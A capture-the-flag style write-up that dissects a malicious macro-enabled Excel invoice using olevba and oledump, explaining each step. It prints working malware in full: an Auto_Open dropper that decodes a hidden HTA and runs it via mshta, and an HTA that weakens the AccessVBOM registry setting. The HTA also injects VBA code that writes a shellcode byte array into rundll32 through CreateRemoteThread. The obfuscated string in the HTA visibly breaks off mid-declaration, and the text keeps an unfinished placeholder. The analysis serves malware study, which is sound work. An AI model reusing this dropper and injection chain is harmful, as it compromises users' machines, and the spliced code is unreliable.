---
cover: .gitbook/assets/Group-581.png
coverY: -112
---

# 🆘 Hands-on analyzing VBA macros

What is VBA? First of all, VB is Visual Basic, “an object-oriented programming language developed by Microsoft. Using Visual Basic makes it fast and easy to create type-safe .NET apps”. [Link](https://learn.microsoft.com/en-us/dotnet/visual-basic/)

VBA means Visual Basic for Application, it’s used to develope a macro in Office documents like Word or Excel. [Link](https://learn.microsoft.com/en-us/office/vba/api/overview/)

Therefore, hackers are likely to take its advantages to create malicious functions to infect our devices. [Link](https://learn.microsoft.com/en-us/microsoft-365/security/intelligence/macro-malware?view=o365-worldwide)

Talking about history, Concept Virus was the first macro virus that targeted Microsoft Word, appeared in 1995.

Nowadays, Microsoft has released a patch that disable macro by default when user downloads a document from Internet in July 2022.

## Overview

In Capture The Flag challenges, they often give us Word or Excel documents, some will be in Office family like RTF file, PowerPoint, etc. So what tools and techniques do we use to analyze them?

I usually use `oletools`, and `oledump` to extract the macro. Most importantly, you should prepare a virtual environment like Windows virtual machine for sandbox analyzing. I’m using highly modified Windows 10 with Flare VM installed.

## Intro the challenge <a href="#obfsc4t10n" id="obfsc4t10n"></a>

The challenge give us an invoice html file.

<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

You can press the download button or simply open an editor and extract the base64 string in it then decode to a file.

The file’s extension is `xlsm` which means it’s an excel file with macro enabled. You can see the list of extensions here.

<figure><img src=".gitbook/assets/image (18).png" alt="" width="563"><figcaption></figcaption></figure>

## Analyst

Let’s use olevba to extract the macro’s source code. Actually, there are many ways to extract the macro’s content. You can use the combination of Alt + F11 to view VBA window when in an Office file like Word or Excel.\


<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

We will use oledump to extract the structure of the macro.

<figure><img src=".gitbook/assets/image (21).png" alt="" width="281"><figcaption></figcaption></figure>

The streams starting with "VBA/" contain the actual VBA code for different modules in the workbook, such as "Module1," "Sheet1," and "ThisWorkbook." These modules may contain macros or other VBA code that perform specific actions when the Excel file is opened or used.

Next step, use olevba to extract macro in files

Empty macro in "Sheet1" and "ThisWorkbook"&#x20;

<figure><img src=".gitbook/assets/image (24).png" alt="" width="375"><figcaption></figcaption></figure>

But in "Module1" we have:

```vba
Private Const clOneMask = 16515072
Private Const clTwoMask = 258048
Private Const clThreeMask = 4032
Private Const clFourMask = 63

Private Const clHighMask = 16711680
Private Const clMidMask = 65280
Private Const clLowMask = 255

Private Const cl2Exp18 = 262144
Private Const cl2Exp12 = 4096
Private Const cl2Exp6 = 64
Private Const cl2Exp8 = 256
Private Const cl2Exp16 = 65536

Public Function LeOyoqoF(sString As String) As String

    Dim bTrans(63) As Byte, lPowers8(255) As Long, lPowers16(255) As Long, bOut() As Byte, bIn() As Byte
    Dim lChar As Long, lTrip As Long, iPad As Integer, lLen As Long, lTemp As Long, lPos As Long, lOutSize As Long

    For lTemp = 0 To 63
        Select Case lTemp
            Case 0 To 25
                bTrans(lTemp) = 65 + lTemp
            Case 26 To 51
                bTrans(lTemp) = 71 + lTemp
            Case 52 To 61
                bTrans(lTemp) = lTemp - 4
            Case 62
                bTrans(lTemp) = 43
            Case 63
                bTrans(lTemp) = 47
        End Select
    Next lTemp

    For lTemp = 0 To 255
        lPowers8(lTemp) = lTemp * cl2Exp8
        lPowers16(lTemp) = lTemp * cl2Exp16
    Next lTemp

    iPad = Len(sString) Mod 3
    If iPad Then
        iPad = 3 - iPad
        sString = sString & String(iPad, Chr(0))
    End If

    bIn = StrConv(sString, vbFromUnicode)
    lLen = ((UBound(bIn) + 1) \ 3) * 4
    lTemp = lLen \ 72
    lOutSize = ((lTemp * 2) + lLen) - 1
    ReDim bOut(lOutSize)

    lLen = 0

    For lChar = LBound(bIn) To UBound(bIn) Step 3
        lTrip = lPowers16(bIn(lChar)) + lPowers8(bIn(lChar + 1)) + bIn(lChar + 2)
        lTemp = lTrip And clOneMask
        bOut(lPos) = bTrans(lTemp \ cl2Exp18)
        lTemp = lTrip And clTwoMask
        bOut(lPos + 1) = bTrans(lTemp \ cl2Exp12)
        lTemp = lTrip And clThreeMask
        bOut(lPos + 2) = bTrans(lTemp \ cl2Exp6)
        bOut(lPos + 3) = bTrans(lTrip And clFourMask)
        If lLen = 68 Then
            bOut(lPos + 4) = 13
            bOut(lPos + 5) = 10
            lLen = 0
            lPos = lPos + 6
        Else
            lLen = lLen + 4
            lPos = lPos + 4
        End If
    Next lChar

    If bOut(lOutSize) = 10 Then lOutSize = lOutSize - 2

    If iPad = 1 Then
        bOut(lOutSize) = 61
    ElseIf iPad = 2 Then
        bOut(lOutSize) = 61
        bOut(lOutSize - 1) = 61
    End If

    LeOyoqoF = StrConv(bOut, vbUnicode)

End Function

Public Function hdYJNJmt(sString As String) As String

    Dim bOut() As Byte, bIn() As Byte, bTrans(255) As Byte, lPowers6(63) As Long, lPowers12(63) As Long
    Dim lPowers18(63) As Long, lQuad As Long, iPad As Integer, lChar As Long, lPos As Long, sOut As String
    Dim lTemp As Long

    sString = Replace(sString, vbCr, vbNullString)
    sString = Replace(sString, vbLf, vbNullString)

    lTemp = Len(sString) Mod 4
    If lTemp Then
        Call Err.Raise(vbObjectError, "", "")
    End If

    If InStrRev(sString, "==") Then
        iPad = 2
    ElseIf InStrRev(sString, "=") Then
        iPad = 1
    End If

    For lTemp = 0 To 255
        Select Case lTemp
            Case 65 To 90
                bTrans(lTemp) = lTemp - 65
            Case 97 To 122
                bTrans(lTemp) = lTemp - 71
            Case 48 To 57
                bTrans(lTemp) = lTemp + 4
            Case 43
                bTrans(lTemp) = 62
            Case 47
                bTrans(lTemp) = 63
        End Select
    Next lTemp

    For lTemp = 0 To 63
        lPowers6(lTemp) = lTemp * cl2Exp6
        lPowers12(lTemp) = lTemp * cl2Exp12
        lPowers18(lTemp) = lTemp * cl2Exp18
    Next lTemp

    bIn = StrConv(sString, vbFromUnicode)
    ReDim bOut((((UBound(bIn) + 1) \ 4) * 3) - 1)

    For lChar = 0 To UBound(bIn) Step 4
        lQuad = lPowers18(bTrans(bIn(lChar))) + lPowers12(bTrans(bIn(lChar + 1))) + _
                lPowers6(bTrans(bIn(lChar + 2))) + bTrans(bIn(lChar + 3))
        lTemp = lQuad And clHighMask
        bOut(lPos) = lTemp \ cl2Exp16
        lTemp = lQuad And clMidMask
        bOut(lPos + 1) = lTemp \ cl2Exp8
        bOut(lPos + 2) = lQuad And clLowMask
        lPos = lPos + 3
    Next lChar

    sOut = StrConv(bOut, vbUnicode)
    If iPad Then sOut = Left$(sOut, Len(sOut) - iPad)
    hdYJNJmt = sOut

End Function

Sub Auto_Open()
    Dim fHdswUyK, GgyYKuJh
    Application.Goto ("JLprrpFr")
    GgyYKuJh = Environ("temp") & "\LwTHLrGh.hta"
    
    Open GgyYKuJh For Output As #1
    Write #1, hdYJNJmt(ActiveSheet.Shapes(2).AlternativeText & UZdcUQeJ.yTJtzjKX & Selection)
    Close #1
    
    fHdswUyK = "msh" & "ta " & GgyYKuJh
    x = Shell(fHdswUyK, 1)
End Sub
```

Damn, what a long source code!

And here is the analysis output of olevba

<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

In the source code lies two extremely suspicious functions that was obfuscated. They’re just normal base64 encode and decode process. How do I know? Just guessing based on output of olevba and some of signatures in `LeOyoqoF` and `hdYJNJmt` function.

Jumping to `Auto_Open` function which is our main target, we can see how this macro works.

```vba
Sub Auto_Open()
    Dim fHdswUyK, GgyYKuJh
    Application.Goto ("JLprrpFr")
    GgyYKuJh = Environ("temp") & "\LwTHLrGh.hta"
    
    Open GgyYKuJh For Output As #1
    Write #1, hdYJNJmt(ActiveSheet.Shapes(2).AlternativeText & UZdcUQeJ.yTJtzjKX & Selection)
    Close #1
    
    fHdswUyK = "msh" & "ta " & GgyYKuJh
    x = Shell(fHdswUyK, 1)
End Sub
```

VBA macros can automatically run itself by Auto\_Open or Workbook\_Open events. These both can execute by opening the excel files manually and click `Enable Content` button.

[https://www.pcreview.co.uk/threads/auto\_open-vs-workbook\_open.953960/](https://www.pcreview.co.uk/threads/auto\_open-vs-workbook\_open.953960/)

Back to the macro, first it declares two variables are `fHdswUyK` and `GgyYKuJh`. Then it called `Application.Goto()` method. This will make the program to select `JLprrpFr` procedure [Link](https://learn.microsoft.com/en-us/office/vba/api/excel.application.goto).

`GgyYKuJh` is a string contain the path to Temp folder of current user in machine. `& "\LwTHLrGh.hta"` just concat the dest file to the path. Maybe this is the dropped file of the macro after its execution.

`ActiveSheet`

VBA object that refers to the currently active worksheet in an Excel workbook. In Excel, when you have multiple worksheets open, the active sheet is the one that is currently displayed on the screen and with which the user is interacting. VBA allows you to manipulate and access the data and properties of the active sheet using this object.

\
`AlternativeText`\
"AlternativeText" is a property that can be used in VBA to access or set the alternative text for certain objects or elements in Excel, such as shapes, pictures, or charts. Alternative text is primarily used for accessibility purposes, as it provides a description of the object's content to users who may not be able to view or interact with the visual content directly (e.g., people with visual impairments who use screen readers).

After that, the macro decode a base64 string in somewhere of the excel file and write it to the dropped file.

Last, execute the file by using **mshta**. The `Shell()` function will take this responsibility.

<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

### Execute the macro

We will need (yes it is obligatory) a Windows VM for this. As I said before, I’m currently using Windows 10 virtual machine with Flare VM installed in it. You can use whatever you want but I recommend you to use at least version 7 or later. We have ver 11 for a long time, why use such an old OS (in case you have to :v).

If you don’t have Office in your VM, just install it then open the xlsm file. Enable the macro content and wait for the result. Here’s the video record of what I did:

{% embed url="https://www.youtube.com/watch?v=1fSET-gfU6E" %}

### Event log

Logging is one of the best thing that mankind have created.

Windows has a logging system called … with evtx files and a program to view it. You can use other parsers but just use the one from Micro$oft. You can do a parallel analysis with Event Log and chainsaw - a tools that extract suspicious content from evtx file based on rules (like Sigma or Yara).

Sometimes, you will need the event log for full-view about the attack. It can give you some clues about the impacts which macros have made in our systems.

\
// Logging after the macro executed?? Need something about evtx logs.



### Dropped file <a href="#dropped-file" id="dropped-file"></a>

Because we have already known the location of the dropped file after macro execution, we can look up that shitty and see what’s inside. Thanks fully that the macro didn’t delete it.

The file is hta which is html but with a program in it, it can be either VBScript or JScript.

```vba
<html><head><script language="vbscript">
Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule

Set objExcel = CreateObject("Excel.Application")
objExcel.Visible = False

Set WshShell = CreateObject("Wscript.Shell")

function RegExists(regKey)
        on error resume next
        WshShell.RegRead regKey
        RegExists = (Err.number = 0)
end function

' Get the old AccessVBOM value
RegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & objExcel.Version & "\Excel\Security\AccessVBOM"

if RegExists(RegPath) then
        action = WshShell.RegRead(RegPath)
else
        action = ""
end if

' Weaken the target
WshShell.RegWrite RegPath, 1, "REG_DWORD"

' Run the macro
Set objWorkbook = objExcel.Workbooks.Add()
Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
xlmodule.CodeModule.AddFromString "Private "&"Type PRO"&"CESS_INF"&"ORMATION"&Chr(10)&"    hPro"&"cess As "&"Long"&Chr(10)&"    hThr"&"ead As L"&"ong"&Chr(10)&"    dwPr"&"ocessId "&"As Long"&Chr(10)&"    dwTh"&"readId A"&"s Long"&Chr(10)& _
"End Type"&Chr(10)&Chr(10)&"Private "&"Type STA"&"RTUPINFO"&Chr(10)&"    cb A"&"s Long"&Chr(10)&"    lpRe"&"served A"&"s String"&Chr(10)&"    lpDe"&"sktop As"&" String"&Chr(10)&"    lpTi"&"tle As S"&"tring"& _
Chr(10)&"    dwX "&"As Long"&Chr(10)&"    dwY "&"As Long"&Chr(10)&"    dwXS"&"ize As L"&"ong"&Chr(10)&"    dwYS"&"ize As L"&"ong"&Chr(10)&"    dwXC"&"ountChar"&"s As Lon"&"g"&Chr(10)&"    dwYC"&"ountChar"& _
"s As Lon"&"g"&Chr(10)&"    dwFi"&"llAttrib"&"ute As L"&"ong"&Chr(10)&"    dwFl"&"ags As L"&"ong"&Chr(10)&"    wSho"&"wWindow "&"As Integ"&"er"&Chr(10)&"    cbRe"&"served2 "&"As Integ"&"er"&Chr(10)&"    lpRe"& _
"served2 "&"As Long"&Chr(10)&"    hStd"&"Input As"&" Long"&Chr(10)&"    hStd"&"Output A"&"s Long"&Chr(10)&"    hStd"&"Error As"&" Long"&Chr(10)&"End Type"&Chr(10)&Chr(10)&Chr(35)&"If VBA7 "&"Then"&Chr(10)& _
"    Priv"&"ate Decl"&"are PtrS"&"afe Func"&"tion Cre"&"ateStuff"&" Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"CreateRe"&"moteThre"&"ad"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"&"s Long"&Chr(44)& _
" ByVal l"&"pThreadA"&"ttribute"&"s As Lon"&"g"&Chr(44)&" ByVal d"&"wStackSi"&"ze As Lo"&"ng"&Chr(44)&" ByVal l"&"pStartAd"&"dress As"&" LongPtr"&Chr(44)&" lpParam"&"eter As "&"Long"&Chr(44)&" ByVal d"& _
"wCreatio"&"nFlags A"&"s Long"&Chr(44)&" lpThrea"&"dID As L"&"ong"&Chr(41)&" As Long"&"Ptr"&Chr(10)&"    Priv"&"ate Decl"&"are PtrS"&"afe Func"&"tion All"&"ocStuff "&"Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "& _
Chr(34)&"VirtualA"&"llocEx"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"&"s Long"&Chr(44)&" ByVal l"&"pAddr As"&" Long"&Chr(44)&" ByVal l"&"Size As "&"Long"&Chr(44)&" ByVal f"&"lAllocat"&"ionType "&"As Long"& _
Chr(44)&" ByVal f"&"lProtect"&" As Long"&Chr(41)&" As Long"&"Ptr"&Chr(10)&"    Priv"&"ate Decl"&"are PtrS"&"afe Func"&"tion Wri"&"teStuff "&"Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"WritePro"& _
"cessMemo"&"ry"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"&"s Long"&Chr(44)&" ByVal l"&"Dest As "&"LongPtr"&Chr(44)&" ByRef S"&"ource As"&" Any"&Chr(44)&" ByVal L"&"ength As"&" Long"&Chr(44)&" ByVal L"& _
"engthWro"&"te As Lo"&"ngPtr"&Chr(41)&" As Long"&"Ptr"&Chr(10)&"    Priv"&"ate Decl"&"are PtrS"&"afe Func"&"tion Run"&"Stuff Li"&"b "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"CreatePr"&"ocessA"&Chr(34)& _
" "&Chr(40)&"ByVal lp"&"Applicat"&"ionName "&"As Strin"&"g"&Chr(44)&" ByVal l"&"pCommand"&"Line As "&"String"&Chr(44)&" lpProce"&"ssAttrib"&"utes As "&"Any"&Chr(44)&" lpThrea"&"dAttribu"&"tes As A"&"ny"& _
Chr(44)&" ByVal b"&"InheritH"&"andles A"&"s Long"&Chr(44)&" ByVal d"&"wCreatio"&"nFlags A"&"s Long"&Chr(44)&" lpEnvir"&"onment A"&"s Any"&Chr(44)&" ByVal l"&"pCurrent"&"Director"&"y As Str"&"ing"&Chr(44)& _
" lpStart"&"upInfo A"&"s STARTU"&"PINFO"&Chr(44)&" lpProce"&"ssInform"&"ation As"&" PROCESS"&"_INFORMA"&"TION"&Chr(41)&" As Long"&Chr(10)&Chr(35)&"Else"&Chr(10)&"    Priv"&"ate Decl"&"are Func"&"tion Cre"& _
"ateStuff"&" Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"CreateRe"&"moteThre"&"ad"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"&"s Long"&Chr(44)&" ByVal l"&"pThreadA"&"ttribute"&"s As Lon"&"g"&Chr(44)& _
" ByVal d"&"wStackSi"&"ze As Lo"&"ng"&Chr(44)&" ByVal l"&"pStartAd"&"dress As"&" Long"&Chr(44)&" lpParam"&"eter As "&"Long"&Chr(44)&" ByVal d"&"wCreatio"&"nFlags A"&"s Long"&Chr(44)&" lpThrea"&"dID As L"& _
"ong"&Chr(41)&" As Long"&Chr(10)&"    Priv"&"ate Decl"&"are Func"&"tion All"&"ocStuff "&"Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"VirtualA"&"llocEx"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"& _
"s Long"&Chr(44)&" ByVal l"&"pAddr As"&" Long"&Chr(44)&" ByVal l"&"Size As "&"Long"&Chr(44)&" ByVal f"&"lAllocat"&"ionType "&"As Long"&Chr(44)&" ByVal f"&"lProtect"&" As Long"&Chr(41)&" As Long"&Chr(10)& _
"    Priv"&"ate Decl"&"are Func"&"tion Wri"&"teStuff "&"Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"WritePro"&"cessMemo"&"ry"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"&"s Long"&Chr(44)&" ByVal l"& _
"Dest As "&"Long"&Chr(44)&" ByRef S"&"ource As"&" Any"&Chr(44)&" ByVal L"&"ength As"&" Long"&Chr(44)&" ByVal L"&"engthWro"&"te As Lo"&"ng"&Chr(41)&" As Long"&Chr(10)&"    Priv"&"ate Decl"&"are Func"&"tion Run"& _
"Stuff Li"&"b "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"CreatePr"&"ocessA"&Chr(34)&" "&Chr(40)&"ByVal lp"&"Applicat"&"g"&Chr(44)&Chr(45)&"79"& _ 
Chr(44)&"116"&Chr(44)&"94"&Chr(44)&Chr(45)&"80"&Chr(44)&"2"&Chr(44)&"72"&Chr(44)&Chr(45)&"22"&Chr(44)&"17"&Chr(44)&Chr(45)&"7"&Chr(44)&Chr(45)&"58"&Chr(44)&"33"&Chr(44)&Chr(45)&"14"&Chr(44)&"113"&Chr(44)& _ 
"127"&Chr(44)&"119"&Chr(44)&"127"&Chr(44)&"26"&Chr(44)&"76"&Chr(44)&"37"&Chr(44)&"2"&Chr(44)&Chr(45)&"38"&Chr(44)&Chr(45)&"38"&Chr(44)&"96"&Chr(44)&Chr(45)&"44"&Chr(44)&Chr(45)&"18"&Chr(44)&Chr(45)&"102"& _ 
Chr(44)&Chr(45)&"116"&Chr(44)&Chr(45)&"15"&Chr(44)&Chr(45)&"124"&Chr(44)&Chr(45)&"37"&Chr(44)&"110"&Chr(44)&Chr(45)&"109"&Chr(44)&Chr(45)&"112"&Chr(44)&Chr(45)&"117"&Chr(44)&Chr(45)&"26"&Chr(44)&"97"&Chr(44)& _ 
Chr(45)&"91"&Chr(44)&"42"&Chr(44)&"76"&Chr(44)&Chr(45)&"20"&Chr(44)&"67"&Chr(44)&"70"&Chr(44)&Chr(45)&"94"&Chr(44)&Chr(45)&"72"&Chr(44)&Chr(45)&"36"&Chr(44)&Chr(45)&"1"&Chr(44)&"91"&Chr(44)&Chr(45)&"31"& _ 
Chr(44)&Chr(45)&"105"&Chr(44)&Chr(45)&"98"&Chr(44)&Chr(45)&"92"&Chr(44)&"60"&Chr(44)&Chr(45)&"46"&Chr(44)&Chr(45)&"95"&Chr(44)&"47"&Chr(44)&Chr(45)&"76"&Chr(44)&"34"&Chr(44)&"111"&Chr(44)&Chr(45)&"40"&Chr(44)& _ 
Chr(45)&"67"&Chr(44)&"48"&Chr(44)&Chr(45)&"104"&Chr(44)&Chr(45)&"65"&Chr(44)&"61"&Chr(44)&Chr(45)&"55"&Chr(44)&"89"&Chr(44)&"42"&Chr(44)&"61"&Chr(44)&Chr(45)&"93"&Chr(44)&"93"&Chr(44)&Chr(45)&"4"&Chr(44)& _ 
"106"&Chr(44)&"91"&Chr(44)&"92"&Chr(44)&Chr(45)&"39"&Chr(44)&"92"&Chr(44)&Chr(45)&"60"&Chr(44)&Chr(45)&"97"&Chr(44)&"12"&Chr(44)&Chr(45)&"33"&Chr(44)&"3"&Chr(44)&"95"&Chr(44)&Chr(45)&"47"&Chr(44)&Chr(45)& _ 
"23"&Chr(44)&"120"&Chr(44)&"86"&Chr(44)&"71"&Chr(44)&"85"&Chr(44)&"23"&Chr(44)&Chr(45)&"105"&Chr(44)&Chr(45)&"121"&Chr(44)&"85"&Chr(44)&Chr(45)&"25"&Chr(44)&Chr(45)&"63"&Chr(44)&Chr(45)&"51"&Chr(44)&"85"& _ 
Chr(44)&Chr(45)&"113"&Chr(44)&Chr(45)&"75"&Chr(44)&Chr(45)&"75"&Chr(44)&"6"&Chr(44)&Chr(45)&"86"&Chr(44)&Chr(45)&"71"&Chr(44)&"99"&Chr(44)&"59"&Chr(44)&"103"&Chr(44)&"44"&Chr(44)&Chr(45)&"116"&Chr(44)&"109"& _ 
Chr(44)&Chr(45)&"37"&Chr(44)&Chr(45)&"25"&Chr(44)&Chr(45)&"28"&Chr(44)&Chr(45)&"109"&Chr(44)&"2"&Chr(44)&Chr(45)&"49"&Chr(44)&Chr(45)&"86"&Chr(44)&"108"&Chr(44)&"97"&Chr(44)&"83"&Chr(44)&Chr(45)&"84"&Chr(44)& _ 
Chr(45)&"110"&Chr(44)&Chr(45)&"9"&Chr(44)&"124"&Chr(44)&"21"&Chr(44)&Chr(45)&"6"&Chr(44)&"7"&Chr(44)&"61"&Chr(44)&Chr(45)&"91"&Chr(44)&Chr(45)&"6"&Chr(44)&"109"&Chr(44)&Chr(45)&"67"&Chr(44)&Chr(45)&"11"& _ 
Chr(44)&Chr(45)&"110"&Chr(44)&"122"&Chr(44)&Chr(45)&"110"&Chr(44)&Chr(45)&"6"&Chr(44)&"82"&Chr(44)&Chr(45)&"126"&Chr(44)&"57"&Chr(44)&"83"&Chr(44)&Chr(45)&"6"&Chr(44)&"9"&Chr(44)&Chr(45)&"84"&Chr(44)&"17"& _ 
Chr(44)&Chr(45)&"101"&Chr(44)&"14"&Chr(44)&Chr(45)&"27"&Chr(44)&Chr(45)&"12"&Chr(44)&"5"&Chr(44)&"14"&Chr(44)&"10"&Chr(44)&"45"&Chr(44)&Chr(45)&"74"&Chr(44)&"117"&Chr(44)&"95"&Chr(44)&Chr(45)&"46"&Chr(44)& _ 
"55"&Chr(44)&Chr(45)&"118"&Chr(44)&Chr(45)&"119"&Chr(44)&Chr(45)&"73"&Chr(44)&"56"&Chr(44)&Chr(45)&"118"&Chr(44)&Chr(45)&"75"&Chr(44)&Chr(45)&"55"&Chr(44)&"5"&Chr(44)&"92"&Chr(44)&Chr(45)&"116"&Chr(44)&Chr(45)& _ 
"65"&Chr(44)&"72"&Chr(44)&"92"&Chr(44)&Chr(45)&"85"&Chr(44)&Chr(45)&"80"&Chr(44)&Chr(45)&"1"&Chr(44)&Chr(45)&"63"&Chr(44)&Chr(45)&"102"&Chr(44)&"90"&Chr(44)&Chr(45)&"1"&Chr(44)&"86"&Chr(44)&Chr(45)&"36"&Chr(44)& _ 
"78"&Chr(41)&Chr(10)&"    If L"&"en"&Chr(40)&"Environ"&Chr(40)&Chr(34)& _
"ProgramW"&"6432"&Chr(34)&Chr(41)&Chr(41)&" "&Chr(62)&" 0 Then"&Chr(10)&"        "&"sProc "&Chr(61)&" Environ"&Chr(40)&Chr(34)&"windir"&Chr(34)&Chr(41)&" "&Chr(38)&" "&Chr(34)&Chr(92)&Chr(92)&"SysWOW64"& _
Chr(92)&Chr(92)&"rundll32"&Chr(46)&"exe"&Chr(34)&Chr(10)&"    Else"&Chr(10)&"        "&"sProc "&Chr(61)&" Environ"&Chr(40)&Chr(34)&"windir"&Chr(34)&Chr(41)&" "&Chr(38)&" "&Chr(34)&Chr(92)&Chr(92)&"System32"& _
Chr(92)&Chr(92)&"rundll32"&Chr(46)&"exe"&Chr(34)&Chr(10)&"    End "&"If"&Chr(10)&Chr(10)&"    res "&Chr(61)&" RunStuf"&"f"&Chr(40)&"sNull"&Chr(44)&" sProc"&Chr(44)&" ByVal 0"&Chr(38)&Chr(44)&" ByVal 0"& _
Chr(38)&Chr(44)&" ByVal 1"&Chr(38)&Chr(44)&" ByVal 4"&Chr(38)&Chr(44)&" ByVal 0"&Chr(38)&Chr(44)&" sNull"&Chr(44)&" sInfo"&Chr(44)&" pInfo"&Chr(41)&Chr(10)&Chr(10)&"    rwxp"&"age "&Chr(61)&" AllocSt"& _
"uff"&Chr(40)&"pInfo"&Chr(46)&"hProcess"&Chr(44)&" 0"&Chr(44)&" UBound"&Chr(40)&"myArray"&Chr(41)&Chr(44)&" "&Chr(38)&"H1000"&Chr(44)&" "&Chr(38)&"H40"&Chr(41)&Chr(10)&"    For "&"offset "&Chr(61)&" LBound"& _
Chr(40)&"myArray"&Chr(41)&" To UBou"&"nd"&Chr(40)&"myArray"&Chr(41)&Chr(10)&"        "&"myByte "&Chr(61)&" myArray"&Chr(40)&"offset"&Chr(41)&Chr(10)&"        "&"res "&Chr(61)&" WriteSt"&"uff"&Chr(40)&"pInfo"& _
Chr(46)&"hProcess"&Chr(44)&" rwxpage"&" "&Chr(43)&" offset"&Chr(44)&" myByte"&Chr(44)&" 1"&Chr(44)&" ByVal 0"&Chr(38)&Chr(41)&Chr(10)&"    Next"&" offset"&Chr(10)&"    res "&Chr(61)&" CreateS"&"tuff"&Chr(40)& _
"pInfo"&Chr(46)&"hProcess"&Chr(44)&" 0"&Chr(44)&" 0"&Chr(44)&" rwxpage"&Chr(44)&" 0"&Chr(44)&" 0"&Chr(44)&" 0"&Chr(41)&Chr(10)&"End Sub"&Chr(10)&"Sub Auto"&"Open"&Chr(40)&Chr(41)&Chr(10)&"    Auto"&"_Open"& _
Chr(10)&"End Sub"&Chr(10)&"Sub Work"&"book_Ope"&"n"&Chr(40)&Chr(41)&Chr(10)&"    Auto"&"_Open"&Chr(10)&"End Sub"&Chr(10)
objExcel.DisplayAlerts = False
on error resume next
objExcel.Run "Auto_Open"
objWorkbook.Close False
objExcel.Quit

' Restore the registry to its old state
if action = "" then
        WshShell.RegDelete RegPath
else
        WshShell.RegWrite RegPath, action, "REG_DWORD"
end if
self.close
</script></head></html>
```

This VBScript code is designed to run a hidden macro inside a Microsoft Excel workbook. It leverages a technique to weaken the security settings of Excel to allow the macro to execute successfully. The code then creates a new Excel workbook, adds a VBA macro to it, and executes that macro.&#x20;

1. **Setting Up Excel Application**: The code creates an instance of the Excel application using the "CreateObject" function and sets its visibility to "False," making the application run in the background (invisible to the user).
2.  **Checking and Modifying Registry Settings**: The code checks if a particular registry key related to Excel's security settings exists. The key is for allowing access to the VBOM (Visual Basic for Applications Object Model). If the key exists, its current value is stored in the "action" variable. If the key doesn't exist, "action" remains empty.

    After that, the code weakens the Excel security settings by setting the registry key "AccessVBOM" to 1, allowing VBA macros to access the VBOM. This change makes it possible to create and run VBA code dynamically.
3. **Creating a New Excel Workbook**: The code creates a new Excel workbook using "objExcel.Workbooks.Add()".
4. **Adding VBA Macro to the Workbook**: The code creates a new VBA module in the newly created workbook ("xlmodule") and adds a VBA code block to it. The VBA code is quite lengthy and appears to be obfuscated to avoid detection. The VBA code creates some custom types ("PROCESS\_INFORMATION" and "STARTUPINFO") and a function ("CreateStuff") which seems to have a remote thread creation capability.
5. **Running the Hidden Macro**: The code uses the "objExcel.Run" method to execute the "Auto\_Open" subroutine within the newly created workbook, which effectively runs the hidden macro.
6. **Closing and Quitting Excel**: After the macro execution, the code closes the newly created workbook without saving changes using "objWorkbook.Close False" and then quits the Excel application using "objExcel.Quit".
7. **Restoring Registry Settings**: Finally, the code checks if the "action" variable contains any value. If it does, it means that a previous "AccessVBOM" registry key setting existed before the macro ran. In that case, it restores the original value of the "AccessVBOM" registry key to its previous state. If "action" is empty, it means that the registry key didn't exist before running the macro, and the code deletes the "AccessVBOM" registry key to restore the original state.

Result:

```vba
Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

#If VBA7 Then
    Private Declare PtrSafe Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr
    Private Declare PtrSafe Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr
    Private Declare PtrSafe Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#Else
    Private Declare Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
